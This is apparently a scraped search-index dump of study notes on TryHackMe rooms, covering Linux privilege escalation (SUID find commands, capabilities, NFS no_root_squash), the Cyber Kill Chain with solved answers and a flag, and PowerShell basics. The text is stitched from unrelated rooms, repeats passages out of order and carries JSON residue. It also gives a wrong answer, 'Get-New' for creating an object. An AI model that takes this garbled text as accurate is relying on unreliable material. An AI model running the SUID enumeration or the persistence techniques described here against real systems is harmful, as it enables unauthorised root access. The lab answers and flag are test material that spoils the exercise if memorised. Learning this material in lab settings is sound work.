Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. Basically, you can change the permission of any file either using the \u201cNumerical\u201d method or \u201cSymbolic\u201d method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration GUID permission is similar to the SUID permission, only difference is \u2013 when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member Enumeration: find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l find / -perm -g = s -type f 2 >/ dev / null | xargs ls -l find / -perm - 4000 -type f -exec ls -la {} 2 >/ dev / null \\; find / -uid 0 -perm - 4000 -type f 2 >/ dev / null // Look for any binaries that seem odd . Any binaries running from a users home directory ? // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root SUID PATH Environmental Variable \u00b6 PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.

NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network. rw: Permit clients to read as well as write access to the shared directory. ro: Permit clients to Read-only access to shared directory. root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account. no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.

And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.

It consists of target identification, decision and order to attack the target, and finally the target destruction. Thanks to Lockheed Martin, a global security and aerospace company, that established the Cyber Kill Chain\u00ae framework for the cybersecurity industry in 2011 based on the military concept. The framework defines the steps used by adversaries or malicious actors in cyberspace. To succeed, an adversary needs to go through all phases of the Kill Chain. We will go through the attack phases and help you better understand adversaries and their techniques used in the attack to defend yourself. So, why is it important to understand how Cyber Kill Chain works? The Cyber Kill Chain will help you understand and protect against ransomware attacks, security breaches as well as Advanced Persistent Threats (APTs). You can use the Cyber Kill Chain to assess your network and system security by identifying missing security controls and closing certain security gaps based on your company's infrastructure. By understanding the Kill Chain as a SOC Analyst, Security Researcher, Threat Hunter, or Incident Responder, you will be able to recognize the intrusion attempts and understand the intruder's goals and objectives. We will be exploring the following attack phases in this room: Reconnaissance Weaponization Delivery Exploitation Installation Command & Control Actions on Objectives Learning Objectives : In this room, you will learn about each phase of the Cyber Kill Chain Framework, the advantages and disadvantages of the traditional Cyber Kill Chain. Outcome : As a result, you will be ready to recognize different phases or stages of the attack carried out by an adversary and be able to break the \"kill chain.\" Task 2: Reconnaissance \u00b6 Reconnaissance To learn what reconnaissance is from the attacker's perspective, first, let's define the term reconnaissance . Reconnaissance is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries. OSINT (Open-Source Intelligence) also falls under reconnaissance. OSINT is the first step an attacker needs to complete to carry out the further phases of an attack. The attacker needs to study the victim by collecting every available piece of information on the company and its employees, such as the company's size, email addresses, phone numbers from publicly available resources to determine the best target for the attack. You can also find out more about OSINT from this Varonis article, \"What is OSINT ?\" Let's look at it from the attacker's perspective, who initially doesn't know what company he wants to attack. Here is the scenario: A malicious attacker who names himself \"Megatron\" decides to conduct a very sophisticated attack that he has been planning out for years; he has been studying and researching different tools and techniques that could help him get to the last phase of the Cyber Kill Chain. But first, he needs to start from the Reconnaissance phase. In order to operate in this phase, the attacker would need to conduct OSINT . Let's have a look at Email harvesting. Email harvesting is the process of obtaining email addressesfrom public, paid, or free services. An attacker can use email-address harvesting for a phishing attack (a type of social-engineering attack used to steal sensitive data, including login credentials and credit card numbers). The attacker will have a big arsenal of tools available for reconnaissance purposes. Here are some of them: theHarvester - other than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources Hunter.io - this is an email hunting tool that will let you obtain contact information associated with the domain OSINT Framework - OSINT Framework provides the collection of OSINT tools based on various categories An attacker would also use social media websites such as LinkedIn, Facebook, Twitter, and Instagram to collect information on a specific victim he would want to attack or the company. The information found on social media can be beneficial for an attacker to conduct a phishing attack. List of the questions solved Question: What is the name of the Intel Gathering Tool that is a web-based interface to the common tools and resources for open-source intelligence? OSINT Framework Question: What is the definition for the email gathering process during the stage of reconnaissance? Email harvesting Task 3: Weaponization \u00b6 Weaponization After a successful reconnaissance stage, \"Megatron\" would work on crafting a \"weapon of destruction\". He would prefer not to interact with the victim directly and, instead, he will create a \"weaponizer\" that, according to Lockheed Martin, combines malware and exploit into a deliverable payload . Most attackers usually use automated tools to generate the malware or refer to the DarkWeb to purchase the malware. More sophisticated actors or nation-sponsored APT (Advanced Persistent Threat Groups) would write their custom malware to make the malware sample unique and evade detection on the target. Let's first define some terminology before we analyze the Weaponization phase. Malware is a program or software that is designed to damage, disrupt, or gain unauthorized access to a computer. An exploit is a program or a code that takes advantage of the vulnerability or flaw in the application or system. A payload is a malicious code that the attacker runs on the system. Continuing with our adversary, \"Megatron\" chooses... \"Megatron\" chooses to buy an already written payload from someone else in the DarkWeb, so that he can spend more time on the other phases. In the Weaponization phase, the attacker would: Create an infected Microsoft Office document containing a malicious macro or VBA (Visual Basic for Applications) scripts. If you want to learn about macro and VBA, please refer to the article \"Intro to Macros and VBA For Script Kiddies\" by TrustedSec . An attacker can create a malicious payload or a very sophisticated worm, implant it on the USB drives, and then distribute them in public. An example of the virus. An attacker would choose Command and Control (C2) techniques for executing the commands on the victim's machine or deliver more payloads. You can read more about the C2 techniques on MITRE ATT&CK . An attacker would select a backdoor implant (the way to access the computer system, which includes bypassing the security mechanisms). List of the questions solved Question: This term is referred to as a group of commands that perform a specific task. You can think of them as subroutines or functions that contain the code that most users use to automate routine tasks. But malicious actors tend to use them for malicious purposes and include them in Microsoft Office documents. Can you provide the term for it? macro Task 4: Delivery \u00b6 Delivery The Delivery phase is when \"Megatron\" decides to choose the method for transmitting the payload or the malware. He has plenty of options to choose from: Phishing email: after conducting the reconnaissance and determining the targets for the attack, the malicious actor would craft a malicious email that would target either a specific person (spearphishing attack) or multiple people in the company. The email would contain a payload or malware. For example, \"Megatron\" would learn that Nancy from the Sales department at company A would constantly like the posts on LinkedIn from Scott, a Service Delivery Manager at company B. He would give it a second guess that they both communicate with each other over work emails. \"Megatron\" would craft an email using Scott's First Name and Last Name, making the domain look similar to the company Scott is working at. An attacker would then send a fake \"Invoice\" email to Nancy, which contains the payload. Distributing infected USB drives in public places like coffee shops, parking lots, or on the street. An attacker might decide to conduct a sophisticated USB Drop Attack by printing the company's logo on the USB drives and mailing them to the company while pretending to be a customer sending the USB devices as a gift. You can read about one of these similar attacks at CSO Online \"Cybercriminal group mails malicious USB dongles to targeted companies.\" Watering hole attack. A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker's choice. The attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending \"harmless\" emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension. List of the questions solved Question: What is the name of the attack when it is performed against a specific group of people, and the attacker seeks to infect the website that the mentioned group of people is constantly visiting. Watering hole attack Task 5: Exploitation \u00b6 Exploitation To gain access to the system, an attacker needs to exploit the vulnerability. In this phase, \"Megatron\" got a little bit creative - he created two phishing emails, one that contains a phishing link to a fake Office 365 login page and another one containing a macro attachment that would execute ransomware when the victim opens it. \"Megatron\" successfully delivered his exploits and got two victims to click on the malicious link and open the malicious file. After gaining access to the system, the malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network. According to CrowdStrike , lateral movement refers to the techniques that a malicious actor uses after gaining initial access to the victim's machine to move deeper into a network to obtain sensitive data. If you want to learn more about server-based or web-based vulnerabilities, please refer to the TryHackMe room OWASP Top 10 . The attacker might also apply a \"Zero-day Exploit\" in this stage. According to FireEye , \"the zero-day exploit or a zero-day vulnerability is an unknown exploit in the wild that exposes a vulnerability in software or hardware and can create complicated problems well before anyone realizes something is wrong. A zero-day exploit leaves NO opportunity for detection at the beginning.\" These are examples of how an attacker carries out exploitation: The victim triggers the exploit by opening the email attachment or clicking on a malicious link. Using a zero-day exploit. Exploit software, hardware, or even human vulnerabilities. An attacker triggers the exploit for server-based vulnerabilities. List of the questions solved Question: Can you provide the name for a cyberattack targeting a software vulnerability that is unknown to the antivirus or software vendors? zero-day Task 6: Installation \u00b6 Installation As you have learned from the Weaponization phase, the backdoor lets an attacker bypass security measures and hide the access. A backdoor is also known as an access point. Once the attacker gets access to the system, he would want to reaccess the system if he loses the connection to it or if he got detected and got the initial access removed, or if the system is later patched. He will no longer have access to it. That is when the attacker needs to install a persistent backdoor . A persistent backdoor will let the attacker access the system he compromised in the past. You can check out the Windows Persistence Room on TryHackMe to learn how an attacker can achieve persistence on Windows. The persistence can be achieved through: Installing a web shell on the webserver. A web shell is a malicious script written in web development programming languages such as ASP, PHP, or JSP used by an attacker to maintain access to the compromised system. Because of the web shell simplicity and file formatting (.php, .asp, .aspx, .jsp, etc.) can be difficult to detect and might be classified as benign. You may check out this great article released by Microsoft on various web shell attacks. Installing a backdoor on the victim's machine. For example, the attacker can use Meterpreter to install a backdoor on the victim's machine. Meterpreter is a Metasploit Framework payload that gives an interactive shell from which an attacker can interact with the victim's machine remotely and execute the malicious code. Creating or modifying Windows services. This technique is known as T1543.003 on MITRE ATT&CK (MITRE ATT&CK\u00ae is a knowledge base of adversary tactics and techniques based on real-world scenarios). An attacker can create or modify the Windows services to execute the malicious scripts or payloads regularly as a part of the persistence. An attacker can use the tools like sc.exe (sc.exe lets you Create, Start, Stop, Query, or Delete any Windows Service) and Reg to modify service configurations. The attacker can also masquerade the malicious payload by using a service name that is known to be related to the Operating System or legitimate software. Adding the entry to the \"run keys\" for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer. According to MITRE ATT&CK, there is a startup folder location for individual user accounts and a system-wide startup folder that will be checked no matter what user account logs in. You can read more about the Registry Run Keys / Startup Folder persistence on one of the MITRE ATT&CK techniques . In this phase, the attacker can also use the Timestomping technique to avoid detection by the forensic investigator and also to make the malware appear as a part of a legitimate program. The Timestomping technique lets an attacker modify the file's timestamps, including the modify, access, create and change times. List of the questions solved Question: Can you provide the technique used to modify file time attributes to hide new or changes to existing files? Timestomping Question: Can you name the malicious script planted by an attacker on the webserver to maintain access to the compromised system and enables the webserver to be accessed remotely? web shell Task 7: Command & Control \u00b6 Command & Control After getting persistence and executing the malware on the victim's machine, \"Megatron\" opens up the C2 (Command and Control) channel through the malware to remotely control and manipulate the victim. This term is also known as C&C or C2 Beaconing as a type of malicious communication between a C&C server and malware on the infected host. The infected host will consistently communicate with the C2 server; that is also where the beaconing term came from. The compromised endpoint would communicate with an external server set up by an attacker to establish a command & control channel. After establishing the connection, the attacker has full control of the victim's machine. Until recently, IRC (Internet Relay Chat) was the traditional C2 channel used by attackers.

THM{7HR347_1N73L_12_4w35om3} Cyber kill chain Task 10: Conclusion \u00b6 Cyber Kill Chain can be a great tool to improve network defence. Is it perfect and can it be the only tool to rely on? No. The traditional Cyber Kill Chain or Lockheed Martin Cyber Kill Chain was last modified in 2011, which, if you remember, is the date of its establishment. The absence of updates and modifications creates security gaps. The traditional Cyber Kill Chain was designed to secure the network perimeter and protect against malware threats. But the cybersecurity threats have developed drastically nowadays, and adversaries are combining multiple TTP (tactics, techniques, and procedures) to achieve their goal. Adversaries are capable of defeating threat intelligence by modifying the file hashes and IP addresses. Security solutions companies are developing technologies like AI (Artificial Intelligence) and different algorithms to detect even slight and suspicious changes. Since the main focus of the framework is on malware delivery and network security, the traditional Cyber Kill Chain will not be able to identify Insider Threats. According to CISA , \"The Insider Threat is the potential for an insider to use their authorized access or understanding of an organization to harm that organization.\" We recommend not only relying on the traditional Cyber Kill Chain model but also referring to MITRE ATT&CK as well as Unified Kill Chain to apply a more comprehensive approach to your defence methodologies.","title":"Cyber Kill Chain"},{"location":"tryhackme/room/cyberkillchainzmt/#cyber-kill-chain","text":"","title":"Cyber Kill Chain"},{"location":"tryhackme/room/cyberkillchainzmt/#task-1-introduction","text":"Cyber kill chain The term kill chain is a military concept related to the structure of an attack. It consists of target identification, decision and order to attack the target, and finally the target destruction. Thanks to Lockheed Martin, a global security and aerospace company, that established the Cyber Kill Chain\u00ae framework for the cybersecurity industry in 2011 based on the military concept. The framework defines the steps used by adversaries or malicious actors in cyberspace. To succeed, an adversary needs to go through all phases of the Kill Chain. We will go through the attack phases and help you better understand adversaries and their techniques used in the attack to defend yourself. So, why is it important to understand how Cyber Kill Chain works? The Cyber Kill Chain will help you understand and protect against ransomware attacks, security breaches as well as Advanced Persistent Threats (APTs). You can use the Cyber Kill Chain to assess your network and system security by identifying missing security controls and closing certain security gaps based on your company's infrastructure. By understanding the Kill Chain as a SOC Analyst, Security Researcher, Threat Hunter, or Incident Responder, you will be able to recognize the intrusion attempts and understand the intruder's goals and objectives. We will be exploring the following attack phases in this room: Reconnaissance Weaponization Delivery Exploitation Installation Command & Control Actions on Objectives Learning Objectives : In this room, you will learn about each phase of the Cyber Kill Chain Framework, the advantages and disadvantages of the traditional Cyber Kill Chain. Outcome : As a result, you will be ready to recognize different phases or stages of the attack carried out by an adversary and be able to break the \"kill chain.\"","title":"Task 1: Introduction"},{"location":"tryhackme/room/cyberkillchainzmt/#task-2-reconnaissance","text":"Reconnaissance To learn what reconnaissance is from the attacker's perspective, first, let's define the term reconnaissance . Reconnaissance is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries. OSINT (Open-Source Intelligence) also falls under reconnaissance. OSINT is the first step an attacker needs to complete to carry out the further phases of an attack. The attacker needs to study the victim by collecting every available piece of information on the company and its employees, such as the company's size, email addresses, phone numbers from publicly available resources to determine the best target for the attack. You can also find out more about OSINT from this Varonis article, \"What is OSINT ?\" Let's look at it from the attacker's perspective, who initially doesn't know what company he wants to attack. Here is the scenario: A malicious attacker who names himself \"Megatron\" decides to conduct a very sophisticated attack that he has been planning out for years; he has been studying and researching different tools and techniques that could help him get to the last phase of the Cyber Kill Chain. But first, he needs to start from the Reconnaissance phase. In order to operate in this phase, the attacker would need to conduct OSINT . Let's have a look at Email harvesting. Email harvesting is the process of obtaining email addressesfrom public, paid, or free services. An attacker can use email-address harvesting for a phishing attack (a type of social-engineering attack used to steal sensitive data, including login credentials and credit card numbers). The attacker will have a big arsenal of tools available for reconnaissance purposes. Here are some of them: theHarvester - other than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources Hunter.io - this is an email hunting tool that will let you obtain contact information associated with the domain OSINT Framework - OSINT Framework provides the collection of OSINT tools based on various categories An attacker would also use social media websites such as LinkedIn, Facebook, Twitter, and Instagram to collect information on a specific victim he would want to attack or the company. The information found on social media can be beneficial for an attacker to conduct a phishing attack. List of the questions solved Question: What is the name of the Intel Gathering Tool that is a web-based interface to the common tools and resources for open-source intelligence? OSINT Framework Question: What is the definition for the email gathering process during the stage of reconnaissance? Email harvesting","title":"Task 2: Reconnaissance"},{"location":"tryhackme/room/cyberkillchainzmt/#task-3-weaponization","text":"Weaponization After a successful reconnaissance stage, \"Megatron\" would work on crafting a \"weapon of destruction\". He would prefer not to interact with the victim directly and, instead, he will create a \"weaponizer\" that, according to Lockheed Martin, combines malware and exploit into a deliverable payload . Most attackers usually use automated tools to generate the malware or refer to the DarkWeb to purchase the malware. More sophisticated actors or nation-sponsored APT (Advanced Persistent Threat Groups) would write their custom malware to make the malware sample unique and evade detection on the target. Let's first define some terminology before we analyze the Weaponization phase. Malware is a program or software that is designed to damage, disrupt, or gain unauthorized access to a computer. An exploit is a program or a code that takes advantage of the vulnerability or flaw in the application or system. A payload is a malicious code that the attacker runs on the system. Continuing with our adversary, \"Megatron\" chooses... \"Megatron\" chooses to buy an already written payload from someone else in the DarkWeb, so that he can spend more time on the other phases. In the Weaponization phase, the attacker would: Create an infected Microsoft Office document containing a malicious macro or VBA (Visual Basic for Applications) scripts. If you want to learn about macro and VBA, please refer to the article \"Intro to Macros and VBA For Script Kiddies\" by TrustedSec . An attacker can create a malicious payload or a very sophisticated worm, implant it on the USB drives, and then distribute them in public. An example of the virus. An attacker would choose Command and Control (C2) techniques for executing the commands on the victim's machine or deliver more payloads. You can read more about the C2 techniques on MITRE ATT&CK . An attacker would select a backdoor implant (the way to access the computer system, which includes bypassing the security mechanisms). List of the questions solved Question: This term is referred to as a group of commands that perform a specific task. You can think of them as subroutines or functions that contain the code that most users use to automate routine tasks. But malicious actors tend to use them for malicious purposes and include them in Microsoft Office documents. Can you provide the term for it? macro","title":"Task 3: Weaponization"},{"location":"tryhackme/room/cyberkillchainzmt/#task-4-delivery","text":"Delivery The Delivery phase is when \"Megatron\" decides to choose the method for transmitting the payload or the malware. He has plenty of options to choose from: Phishing email: after conducting the reconnaissance and determining the targets for the attack, the malicious actor would craft a malicious email that would target either a specific person (spearphishing attack) or multiple people in the company. The email would contain a payload or malware. For example, \"Megatron\" would learn that Nancy from the Sales department at company A would constantly like the posts on LinkedIn from Scott, a Service Delivery Manager at company B. He would give it a second guess that they both communicate with each other over work emails. \"Megatron\" would craft an email using Scott's First Name and Last Name, making the domain look similar to the company Scott is working at. An attacker would then send a fake \"Invoice\" email to Nancy, which contains the payload. Distributing infected USB drives in public places like coffee shops, parking lots, or on the street. An attacker might decide to conduct a sophisticated USB Drop Attack by printing the company's logo on the USB drives and mailing them to the company while pretending to be a customer sending the USB devices as a gift. You can read about one of these similar attacks at CSO Online \"Cybercriminal group mails malicious USB dongles to targeted companies.\" Watering hole attack. A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker's choice. The attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending \"harmless\" emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension. List of the questions solved Question: What is the name of the attack when it is performed against a specific group of people, and the attacker seeks to infect the website that the mentioned group of people is constantly visiting. Watering hole attack","title":"Task 4: Delivery"},{"location":"tryhackme/room/cyberkillchainzmt/#task-5-exploitation","text":"Exploitation To gain access to the system, an attacker needs to exploit the vulnerability. In this phase, \"Megatron\" got a little bit creative - he created two phishing emails, one that contains a phishing link to a fake Office 365 login page and another one containing a macro attachment that would execute ransomware when the victim opens it. \"Megatron\" successfully delivered his exploits and got two victims to click on the malicious link and open the malicious file. After gaining access to the system, the malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network. According to CrowdStrike , lateral movement refers to the techniques that a malicious actor uses after gaining initial access to the victim's machine to move deeper into a network to obtain sensitive data. If you want to learn more about server-based or web-based vulnerabilities, please refer to the TryHackMe room OWASP Top 10 . The attacker might also apply a \"Zero-day Exploit\" in this stage. According to FireEye , \"the zero-day exploit or a zero-day vulnerability is an unknown exploit in the wild that exposes a vulnerability in software or hardware and can create complicated problems well before anyone realizes something is wrong. A zero-day exploit leaves NO opportunity for detection at the beginning.\" These are examples of how an attacker carries out exploitation: The victim triggers the exploit by opening the email attachment or clicking on a malicious link. Using a zero-day exploit. Exploit software, hardware, or even human vulnerabilities. An attacker triggers the exploit for server-based vulnerabilities.

A backdoor is also known as an access point. Once the attacker gets access to the system, he would want to reaccess the system if he loses the connection to it or if he got detected and got the initial access removed, or if the system is later patched. He will no longer have access to it. That is when the attacker needs to install a persistent backdoor . A persistent backdoor will let the attacker access the system he compromised in the past. You can check out the Windows Persistence Room on TryHackMe to learn how an attacker can achieve persistence on Windows. The persistence can be achieved through: Installing a web shell on the webserver. A web shell is a malicious script written in web development programming languages such as ASP, PHP, or JSP used by an attacker to maintain access to the compromised system. Because of the web shell simplicity and file formatting (.php, .asp, .aspx, .jsp, etc.) can be difficult to detect and might be classified as benign. You may check out this great article released by Microsoft on various web shell attacks. Installing a backdoor on the victim's machine. For example, the attacker can use Meterpreter to install a backdoor on the victim's machine. Meterpreter is a Metasploit Framework payload that gives an interactive shell from which an attacker can interact with the victim's machine remotely and execute the malicious code. Creating or modifying Windows services. This technique is known as T1543.003 on MITRE ATT&CK (MITRE ATT&CK\u00ae is a knowledge base of adversary tactics and techniques based on real-world scenarios). An attacker can create or modify the Windows services to execute the malicious scripts or payloads regularly as a part of the persistence. An attacker can use the tools like sc.exe (sc.exe lets you Create, Start, Stop, Query, or Delete any Windows Service) and Reg to modify service configurations. The attacker can also masquerade the malicious payload by using a service name that is known to be related to the Operating System or legitimate software. Adding the entry to the \"run keys\" for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer. According to MITRE ATT&CK, there is a startup folder location for individual user accounts and a system-wide startup folder that will be checked no matter what user account logs in. You can read more about the Registry Run Keys / Startup Folder persistence on one of the MITRE ATT&CK techniques . In this phase, the attacker can also use the Timestomping technique to avoid detection by the forensic investigator and also to make the malware appear as a part of a legitimate program. The Timestomping technique lets an attacker modify the file's timestamps, including the modify, access, create and change times. List of the questions solved Question: Can you provide the technique used to modify file time attributes to hide new or changes to existing files? Timestomping Question: Can you name the malicious script planted by an attacker on the webserver to maintain access to the compromised system and enables the webserver to be accessed remotely? web shell","title":"Task 6: Installation"},{"location":"tryhackme/room/cyberkillchainzmt/#task-7-command-control","text":"Command & Control After getting persistence and executing the malware on the victim's machine, \"Megatron\" opens up the C2 (Command and Control) channel through the malware to remotely control and manipulate the victim. This term is also known as C&C or C2 Beaconing as a type of malicious communication between a C&C server and malware on the infected host. The infected host will consistently communicate with the C2 server; that is also where the beaconing term came from. The compromised endpoint would communicate with an external server set up by an attacker to establish a command & control channel. After establishing the connection, the attacker has full control of the victim's machine. Until recently, IRC (Internet Relay Chat) was the traditional C2 channel used by attackers. This is no longer the case, as modern security solutions can easily detect malicious IRC traffic.

For example, the differences between CMD, PS and some syntax. This room will cover the following: What is Powershell Basic Powershell commands Windows enumeration skills Powershell scripting Answer the questions below Read the above and deploy the machine! No answer needed Task 2: What is Powershell? \u00b6 Content Powershell is the Windows Scripting Language and shell environment built using the .NET framework. This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples . For example, we want to see the usage of the Get-Command[^2] command, we use the Get-Help Get-Command -Examples syntax. See picture bellow. Image title This pic describes how to use the Get-Command command syntax Task 3: Basic Powershell Commands \u00b6 Content Now that we've understood how cmdlets work - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends! Using Get-Help \u00b6 Get-Help displays information about a cmdlet. To get help with a particular command, run the following: Get-Help Command-Name You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: Running the Get-Help cmdlet to explain a command PS C :\\ Users \\ Administrator > Get-Help Get-Command -Examples NAME Get-Command SYNOPSIS Gets all commands . Example 1 : Get cmdlets , functions , and aliases PS C :\\> Get-Command Using Get-Command \u00b6 Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following Get-Command Verb-* or Get-Command *-Noun Running Get-Command New-* to view all the cmdlets for the verb new displays the following: Using the Get-Command to list all cmdlets installed PS C :\\ Users \\ Administrator > Get-Command New -* CommandType Name Version Source ----------- ---- ------- ------ Alias New-AWSCredentials 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2FlowLogs 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2Hosts 3 . 3 . 563 . 1 AWSPowerShell Alias New-RSTags 3 . 3 . 563 . 1 AWSPowerShell Alias New-SGTapes 3 . 3 . 563 . 1 AWSPowerShell Function New-AutologgerConfig 1 . 0 . 0 . 0 EventTracingManagement Function New-DAEntryPointTableItem 1 . 0 . 0 . 0 DirectAccessClientComponents Function New-DscChecksum 1 . 1 PSDesiredStateConfiguration Function New-EapConfiguration 2 . 0 . 0 . 0 VpnClient Function New-EtwTraceSession 1 . 0 . 0 . 0 EventTracingManagement Function New-FileShare 2 . 0 . 0 . 0 Storage Function New-Fixture 3 . 4 . 0 Pester Function New-Guid 3 . 1 . 0 . 0 Microsoft . PowerShell . Utility - -cropped for brevity -- Object Manipulation \u00b6 In the previous task, we saw how the output of every cmdlet is an object. If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet: Verb-Noun | Get-Member An example of running this to view the members for Get-Command is: Get-Command | Get-Member -MemberType Method Using pipe (|) to pass output from one cmdlet to another PS C :\\ Users \\ Administrator > Get-Command | Get-Member -MemberType Method TypeName : System . Management . Automation . AliasInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System .

ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () PS C :\\ Users \\ Administrator > From the above flag in the command, you can see that you can also select between methods and properties. Creating Objects From Previous cmdlets \u00b6 One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Here's an example of listing the directories and just selecting the mode and the name: Listing the directories and filtering via mode and name PS C :\\ Users \\ Administrator > Get-ChildItem | Select-Object -Property Mode , Name Mode Name ---- ---- d-r --- Contacts d-r --- Desktop d-r --- Documents d-r --- Downloads d-r --- Favorites d-r --- Links d-r --- Music d-r --- Pictures d-r --- Saved Games d-r --- Searches d-r --- Videos PS C :\\ Users \\ Administrator > You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objects Filtering Objects \u00b6 When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. The general format for using this cmdlet is Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet . Powershell is quite sensitive, so don't put quotes around the command! Where -operator is a list of the following operators: -Contains : if any item in the property value is an exact match for the specified value -EQ : if the property value is the same as the specified value -GT : if the property value is greater than the specified value For a full list of operators, use this link. Here's an example of checking the stopped processes: Demonstrating the use of operators only to show stopped services PS C :\\ Users \\ Administrator > Get-Service | Where-Object -Property Status -eq Stopped Status Name DisplayName ------ ---- ----------- Stopped AJRouter AllJoyn Router Service Stopped ALG Application Layer Gateway Service Stopped AppIDSvc Application Identity Stopped AppMgmt Application Management Stopped AppReadiness App Readiness Stopped AppVClient Microsoft App-V Client Stopped AppXSvc AppX Deployment Service ( AppXSVC ) Stopped AudioEndpointBu ... Windows Audio Endpoint Builder Stopped Audiosrv Windows Audio Stopped AxInstSV ActiveX Installer ( AxInstSV ) Stopped BITS Background Intelligent Transfer Ser ...

Task 5: Basic Scripting Challenge \u00b6 Now that we have run Powershell commands, let's try to write and run a script to do more complex and powerful actions. For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Image title Now that we've seen what a basic script looks like - it's time to write one of your own. The emails folder on the Desktop contains copies of the emails John, Martha, and Mary have been sending to each 